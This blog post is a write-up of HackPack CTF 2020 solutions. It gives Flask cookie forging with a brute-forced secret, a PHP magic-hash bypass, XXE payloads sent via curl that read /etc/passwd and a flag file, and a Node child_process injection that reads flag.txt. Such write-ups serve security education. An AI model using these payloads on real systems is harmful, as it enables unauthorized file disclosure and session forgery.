---
layout: post
title: HackPack CTF 2020
categories: [Capture The Flag]
tags: [hackpack, web, pwn, misc]

---

[Hackpack](https://ctf2020.hackpack.club/challenges) is an educational CTF that aims to complement security courses at North Carolina State University. Date: vie, 17 abr. 2020, 17:00 UTC — mar, 28 abr. 2020, 03:59 UTC


## Web
- Cookie Forge. When we log in, a cookie named session appears (this is the JWT). In the Flagship Loyalty section, we see this Warning: "You aren't a Flagship Loyalty Member! No cookies for you!!".
```
flask-unsign -d -c 'eyJmbGFnc2hpcCI6dHJ1ZSwidXNlcm5hbWUiOiJhYSIsImFsZyI6IkhTMjU2In0.e30.yoxyotdennG9lsGnJNK1REYuSNqVUmN_ijyN26xO3z8'  
{'flagship': True, 'username': 'aa', 'alg': 'HS256'}
flask-unsign --server https://cookie-forge.cha.hackpack.club/orders --unsign  // bruteforce psw is password1
flask-unsign --sign --secret password1 --cookie "{'flagship': True, 'username': 'aa'}"
```
Editing the cookie, we get the flag.

- Treasure Map: 
https://treasure-map.cha.hackpack.club/robots.txt ->
view-source:https://treasure-map.cha.hackpack.club/treasuremap.xml ->
view-source:https://treasure-map.cha.hackpack.club/7BmqJfhWhEa30NeVj7j2.html -> Flag

- Super Secret Flag Vault: The Index.php file shows us a PHP script comparing a specific hash. For this, we use the well-known: PHP magic hashes. Where 0+e[0-9]+ compared with == returns true. For eg -'0e1' == '00e2'. We put as input "KnCM6ogsNA1W" whose hash is 00e73414578113850089230341919829.

- Paster: view-source -> src="frames/index.php" -> src="game-frame.js" where a JSfuck code appears. Using https://enkhee-osiris.github.io/Decoder-JSFuck/, we get:
```
parent.postMessage(window.location.toString(),"*");var originalAlert=window.alert;window.alert=function(t){parent.postMessage("success","*"),flag=atob("ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99"),setTimeout(function(){originalAlert("Congratulations, you executed an alert:\n\n"+t+"\n\nhere is the flag: "+flag)},50)};d
```
Inspect the site and, in the console section, write: flag=atob("ZmxhZ3t4NTVfaTVOdF83aEE3X2JBRF9SMUdoNz99") -> "flag{x55_i5Nt_7hA7_bAD_R1Gh7?}"

- Custom UI: Inserting '<', we get "Warning: DOMDocument::loadXML():". This is a [XML External Entity Injection](https://portswigger.net/web-security/xxe).
We see that there is a xdata variable, so we can inject here our data. xdata: <1button><1color> mn<1/color><1value><1/value><1/button>
Injection: 
```
<1!DOCTYPE foo [<1!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><1button><1color>&xxe;<1/color><1value>iii<1/value><1/button>
```
[URL encoded](https://www.urlencoder.org/): 
```
%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e
```
```
curl "https://custom-ui.cha.hackpack.club/" -d xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e
```

Changing the cookie to True:

```
curl "https://custom-ui.cha.hackpack.club/" -d xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fpasswd%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e -v --cookie "debug=true"
...
</div>
<!-- TODO: Delete flag.txt from /etc/ --></body>
...

```
Injection: 
```
<1!DOCTYPE foo [<1!ENTITY xxe SYSTEM "file:///etc/flag.txt"> ]><1button><1color>&xxe;<1/color><1value>iii<1/value><1/button>
```
```
curl "https://custom-ui.cha.hackpack.club/" -d xdata=%3c!DOCTYPE%20foo%20[%3c!ENTITY%20xxe%20SYSTEM%20%22file%3a%2f%2f%2fetc%2fflag.txt%22%3e%20]%3e%3cbutton%3e%3ccolor%3e%26xxe%3b%3c%2fcolor%3e%3cvalue%3eiii%3c%2fvalue%3e%3c%2fbutton%3e -v --cookie "debug=true"
```
And we get the flag.

## PWN 
- Jsclean: the python file is asking for a js file and a js code. In the python script we can see that it refers to index.js, so we know that this is the file to clean: index.js and the js code is: 
```
require("child_process").exec("cat flag.txt", function(error, stdout, stderr){console.log(stdout);});
```

## Misc
- Soundy: using a sstv decoder.
![]({{ site.baseurl }}/images/HackPack-sstv.jpeg)
-Listen up!: when we use the exiftool command, we get a comment with an [URL](https://www.youtube.com/watch?v=2xZgCVG_Bzk) about MS Paint EXE file. We need to convert the audio to RAW format (it is the uncompressed audio).
